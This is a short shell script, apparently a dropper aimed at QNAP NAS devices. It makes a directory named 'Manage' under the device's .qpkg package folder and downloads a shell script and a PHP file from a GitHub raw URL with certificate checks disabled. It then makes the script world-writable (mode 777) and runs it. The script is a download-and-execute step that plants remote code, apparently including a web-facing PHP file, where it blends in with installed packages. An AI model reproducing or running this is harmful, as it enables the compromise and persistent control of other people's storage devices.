#/binsh

mkdir /share/CACHEDEV1_DATA/.qpkg/Manage/
wget --no-check-certificate -O /share/CACHEDEV1_DATA/.qpkg/Manage/H2110.sh https://raw.githubusercontent.com/l0ve6it/qnaa/master/H2110.sh  
wget --no-check-certificate -O /share/CACHEDEV1_DATA/.qpkg/Manage/H2110.php https://raw.githubusercontent.com/l0ve6it/qnaa/master/H2110.php
chmod 777 /share/CACHEDEV1_DATA/.qpkg/Manage/H2110.sh  
sh /share/CACHEDEV1_DATA/.qpkg/Manage/H2110.sh   start
